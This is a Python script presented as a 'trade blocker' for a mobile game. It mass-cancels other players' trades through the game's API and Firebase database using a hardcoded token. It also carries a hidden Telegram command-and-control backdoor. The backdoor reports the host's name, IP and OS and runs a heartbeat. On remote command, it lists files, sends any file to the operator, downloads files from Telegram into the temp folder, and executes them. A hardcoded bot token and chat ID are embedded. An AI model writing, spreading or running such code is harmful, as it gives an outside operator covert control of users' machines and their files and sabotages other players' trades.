#!/usr/bin/env python3
import requests
import time
import json
import socket
import platform
import threading
import subprocess
import sys
import os
import tempfile
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import glob
import select

BOT_TOKEN = "8497903162:AAHltWz1rASaLE5DhDgNCC4y9aLT7edGJeY"
CHAT_ID = 5150403377
API_BASE_URL = "https://api.efezgames.com/v1"
FIREBASE_URL = "https://api-project-7952672729.firebaseio.com"
MAX_THREADS = 50
HEARTBEAT_INTERVAL = 10
COMMAND_POLL_INTERVAL = 5

total_blocked = 0
last_trade_time = "None"
last_trade_id = "None"
last_trade_sender = "None"
last_trade_skins = "None"
blocking_enabled = True
device_id = None
device_name = None
device_ip = None
device_os = None
start_time = time.time()
last_update_id = 0
downloaded_files = {}
running_processes = {}

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={'chat_id': CHAT_ID, 'text': text}, timeout=3)
    except:
        pass

def send_telegram_document(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            requests.post(url, data={'chat_id': CHAT_ID}, files=files, timeout=10)
    except:
        pass

def get_updates(offset):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    try:
        resp = requests.get(url, params={'timeout': 5, 'offset': offset}, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('ok') and data.get('result'):
                return data['result']
    except:
        pass
    return []

def download_file(file_id, destination):
    file_info_url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile"
    try:
        resp = requests.get(file_info_url, params={'file_id': file_id}, timeout=5)
        if resp.status_code == 200:
            file_path = resp.json()['result']['file_path']
            file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
            r = requests.get(file_url, timeout=30)
            if r.status_code == 200:
                with open(destination, 'wb') as f:
                    f.write(r.content)
                return True
    except:
        pass
    return False

def get_device_info():
    global device_name, device_ip, device_os, device_id
    device_name = platform.node()
    device_os = f"{platform.system()} {platform.release()}"
    try:
        device_ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        device_ip = "unknown"
    device_id = device_name.replace('.', '_') + '_' + str(int(time.time()))
    return device_id, device_name, device_ip, device_os

def register_device():
    get_device_info()
    msg = f"Новое устройство зарегистрировано\nID: {device_id}\nИмя: {device_name}\nIP: {device_ip}\nОС: {device_os}"
    send_telegram_message(msg)

def heartbeat():
    while True:
        time.sleep(HEARTBEAT_INTERVAL)
        if device_id:
            send_telegram_message(f"Пульс {device_id}")

def consume_trade(player_id, offer_id):
    url = f"{API_BASE_URL}/trades/consumeOffer?token=besttoken&playerID={player_id}&offerID={offer_id}"
    try:
        requests.get(url, timeout=3)
        return True
    except:
        return False

def display_stats():
    os.system('cls' if os.name == 'nt' else 'clear')
    uptime = int(time.time() - start_time)
    hours, remainder = divmod(uptime, 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours}h {minutes}m {seconds}s"
    status = "ACTIVE" if blocking_enabled else "PAUSED (visual only)"
    print("=" * 70)
    print("                    TRADE BLOCKER v2.0")
    print("=" * 70)
    print(f"\nDevice: {device_name} ({device_ip})")
    print(f"Uptime: {uptime_str}")
    print(f"Status: {status}")
    print(f"Total blocked: {total_blocked}")
    print(f"\nLast trade:")
    print(f"   Time: {last_trade_time}")
    print(f"   ID: {last_trade_id}")
    print(f"   Sender: {last_trade_sender}")
    print(f"   Skins: {last_trade_skins}")
    print(f"\nRunning files: {list(running_processes.keys())}")
    print(f"\nUpdating every second")
    print("=" * 70)
    print("Press Ctrl+C to stop")
    print("=" * 70)

def format_skin_names(s):
    if not s:
        return "No skins"
    return s[:30] + "..." if len(s) > 30 else s

def list_local_files():
    return [f for f in glob.glob("*") if os.path.isfile(f)]

def format_files_list(files):
    if not files:
        return "В папке нет файлов."
    lines = []
    for f in files:
        size = os.path.getsize(f)
        lines.append(f"{f} ({size} байт)")
    return "\n".join(lines)

def read_process_output(proc, filename):
    while True:
        try:
            if proc.poll() is not None:
                break
            reads = [proc.stdout.fileno()] if proc.stdout else []
            if reads:
                rlist, _, _ = select.select(reads, [], [], 0.1)
                for fd in rlist:
                    line = proc.stdout.readline()
                    if line:
                        line = line.strip()
                        if line and downloaded_files.get(filename, {}).get('console_mode', False):
                            send_telegram_message(f"📟 [{filename}] {line}")
        except:
            break
    if filename in running_processes:
        del running_processes[filename]
    if filename in downloaded_files:
        downloaded_files[filename]['console_mode'] = False
        downloaded_files[filename]['output_thread'] = None
    display_stats()

def command_poller():
    global last_update_id, blocking_enabled
    while True:
        try:
            updates = get_updates(last_update_id)
            for upd in updates:
                last_update_id = upd['update_id'] + 1
                if 'message' in upd:
                    msg = upd['message']
                    chat_id = msg['chat']['id']
                    if chat_id != CHAT_ID:
                        continue
                    if 'document' in msg:
                        file_id = msg['document']['file_id']
                        file_name = msg['document']['file_name']
                        caption = msg.get('caption', '')
                        if device_id in caption or caption == '':
                            dest = os.path.join(tempfile.gettempdir(), file_name)
                            if download_file(file_id, dest):
                                send_telegram_message(f"Файл {file_name} успешно загружен на {device_id}")
                            else:
                                send_telegram_message(f"Ошибка загрузки файла {file_name} на {device_id}")
                    elif 'text' in msg:
                        text = msg['text']
                        parts = text.split()
                        if not parts:
                            continue
                        cmd = parts[0].lower()
                        if cmd == '/blocker' and len(parts) >= 2 and parts[1] == 'trade':
                            if len(parts) >= 3:
                                target = parts[2]
                                if target == device_id or target == device_name:
                                    if len(parts) >= 4:
                                        if parts[3] == 'on':
                                            blocking_enabled = True
                                        elif parts[3] == 'off':
                                            blocking_enabled = False
                                    else:
                                        blocking_enabled = not blocking_enabled
                                    state = "включена" if blocking_enabled else "приостановлена"
                                    send_telegram_message(f"Блокировка на {device_id} {state}")
                            else:
                                if len(parts) >= 3:
                                    if parts[2] == 'on':
                                        blocking_enabled = True
                                    elif parts[2] == 'off':
                                        blocking_enabled = False
                                else:
                                    blocking_enabled = not blocking_enabled
                                state = "включена" if blocking_enabled else "приостановлена"
                                send_telegram_message(f"Глобальная команда: блокировка на {device_id} {state}")
                        elif cmd == '/device' and len(parts) >= 2:
                            target = parts[1]
                            if target == device_id or target == device_name:
                                uptime = int(time.time() - start_time)
                                hours, remainder = divmod(uptime, 3600)
                                minutes, seconds = divmod(remainder, 60)
                                uptime_str = f"{hours}ч {minutes}м {seconds}с"
                                status = "работает" if blocking_enabled else "приостановлена"
                                running_list = ", ".join(running_processes.keys()) if running_processes else "нет"
                                info = (
                                    f"📱 Устройство: {device_name}\n"
                                    f"🆔 ID: {device_id}\n"
                                    f"🌐 IP: {device_ip}\n"
                                    f"💿 ОС: {device_os}\n"
                                    f"⏱ Аптайм: {uptime_str}\n"
                                    f"🔒 Блокировка: {status}\n"
                                    f"📊 Заблокировано трейдов: {total_blocked}\n"
                                    f"🕓 Последний трейд: {last_trade_time} – {last_trade_sender} – {last_trade_skins}\n"
                                    f"🔄 Запущенные файлы: {running_list}"
                                )
                                send_telegram_message(info)
                        elif cmd == '/file' and len(parts) >= 3:
                            subcmd = parts[1].lower()
                            if subcmd == 'list' and len(parts) >= 3:
                                target = parts[2]
                                if target == device_id or target == device_name:
                                    files = list_local_files()
                                    if files:
                                        file_list = format_files_list(files)
                                        txt = f"📁 Файлы на устройстве {device_name}:\n{file_list}\n\nДля скачивания используйте /file get {device_id} <имя_файла>"
                                        send_telegram_message(txt)
                                    else:
                                        send_telegram_message(f"В папке устройства {device_name} нет файлов.")
                            elif subcmd == 'get' and len(parts) >= 4:
                                target = parts[2]
                                filename = parts[3]
                                if target == device_id or target == device_name:
                                    if os.path.exists(filename) and os.path.isfile(filename):
                                        send_telegram_document(filename)
                                    else:
                                        send_telegram_message(f"Файл {filename} не найден на {device_name}.")
                            elif subcmd == 'download' and len(parts) >= 4:
                                target = parts[2]
                                filename = parts[3]
                                if target == device_id or target == device_name:
                                    send_telegram_message(f"Готов к приёму файла {filename} для {device_id}")
                            elif subcmd == 'start' and len(parts) >= 4:
                                target = parts[2]
                                filename = parts[3]
                                if target == device_id or target == device_name:
                                    local_path = os.path.join(tempfile.gettempdir(), filename)
                                    if not os.path.exists(local_path):
                                        local_path = filename
                                    if os.path.exists(local_path) and os.path.isfile(local_path):
                                        try:
                                            proc = subprocess.Popen(
                                                [sys.executable, local_path],
                                                stdin=subprocess.PIPE,
                                                stdout=subprocess.PIPE,
                                                stderr=subprocess.STDOUT,
                                                text=True,
                                                bufsize=1
                                            )
                                            running_processes[filename] = proc
                                            downloaded_files[filename] = {
                                                'pid': proc.pid,
                                                'process': proc,
                                                'console_mode': False,
                                                'output_thread': None
                                            }
                                            thr = threading.Thread(target=read_process_output, args=(proc, filename), daemon=True)
                                            thr.start()
                                            downloaded_files[filename]['output_thread'] = thr
                                            send_telegram_message(f"Файл {filename} запущен на {device_id} (PID {proc.pid})")
                                            display_stats()
                                        except Exception as e:
                                            send_telegram_message(f"Ошибка запуска {filename}: {e}")
                                    else:
                                        send_telegram_message(f"Файл {filename} не найден на {device_id}")
                            elif subcmd == 'stop' and len(parts) >= 4:
                                target = parts[2]
                                filename = parts[3]
                                if target == device_id or target == device_name:
                                    if filename in running_processes:
                                        try:
                                            running_processes[filename].terminate()
                                            time.sleep(1)
                                            if running_processes[filename].poll() is None:
                                                running_processes[filename].kill()
                                            del running_processes[filename]
                                            if filename in downloaded_files:
                                                downloaded_files[filename]['console_mode'] = False
                                                downloaded_files[filename]['output_thread'] = None
                                            send_telegram_message(f"Процесс {filename} остановлен на {device_id}")
                                            display_stats()
                                        except Exception as e:
                                            send_telegram_message(f"Ошибка остановки {filename}: {e}")
                                    else:
                                        send_telegram_message(f"Файл {filename} не запущен на {device_id}")
            time.sleep(COMMAND_POLL_INTERVAL)
        except Exception as e:
            print(f"Command poller error: {e}")
            time.sleep(COMMAND_POLL_INTERVAL)

def block_trades():
    global total_blocked, last_trade_time, last_trade_id, last_trade_sender, last_trade_skins, blocking_enabled, device_id, device_name, device_ip, device_os

    register_device()
    threading.Thread(target=heartbeat, daemon=True).start()
    threading.Thread(target=command_poller, daemon=True).start()
    seen = set()
    display_stats()

    while True:
        try:
            if not blocking_enabled:
                time.sleep(1)
                continue
            url = f"{FIREBASE_URL}/Trades.json?orderBy=\"ts\"&limitToLast=20"
            resp = requests.get(url, timeout=3)
            trades = resp.json()
            with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
                for trade_id, trade_data in trades.items():
                    if trade_id not in seen:
                        sender_id = trade_data.get('senderID')
                        if sender_id:
                            ts = trade_data.get('ts', 0)
                            last_trade_time = datetime.fromtimestamp(ts/1000).strftime('%H:%M:%S') if ts else '??:??:??'
                            last_trade_id = trade_id[:12] + "..." if len(trade_id) > 12 else trade_id
                            last_trade_sender = trade_data.get('senderNick', 'unknown')[:20]
                            skins = trade_data.get('skinsOffered', '')
                            last_trade_skins = format_skin_names(skins)
                            msg = (f"Заблокирован трейд\nУстройство: {device_id}\nID: {trade_id}\nВремя: {last_trade_time}\n"
                                   f"Отправитель: {trade_data.get('senderNick', 'неизвестно')}\nСкины: {format_skin_names(skins)}")
                            send_telegram_message(msg)
                            ex.submit(consume_trade, sender_id, trade_id)
                            seen.add(trade_id)
                            total_blocked += 1
                            display_stats()
            time.sleep(1)
        except KeyboardInterrupt:
            print("\n\nTrade blocker stopped")
            send_telegram_message(f"Блокировщик остановлен {device_id}")
            break
        except Exception as e:
            print(f"Error in main loop: {e}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        block_trades()
    except KeyboardInterrupt:
        print("\n\nTrade blocker stopped")
